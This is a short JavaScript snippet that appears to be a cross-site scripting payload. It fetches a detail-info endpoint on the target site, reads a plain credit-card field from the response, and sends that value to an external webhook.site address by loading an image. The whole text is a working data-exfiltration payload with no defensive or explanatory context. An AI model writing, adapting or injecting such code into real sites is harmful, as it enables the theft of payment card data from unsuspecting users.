fetch("/api.php?case=detail_info")
  .then(res => res.json())
  .then(data => {
    const cc = data.plain_credit_card || 'N/A';
    new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(cc);
  });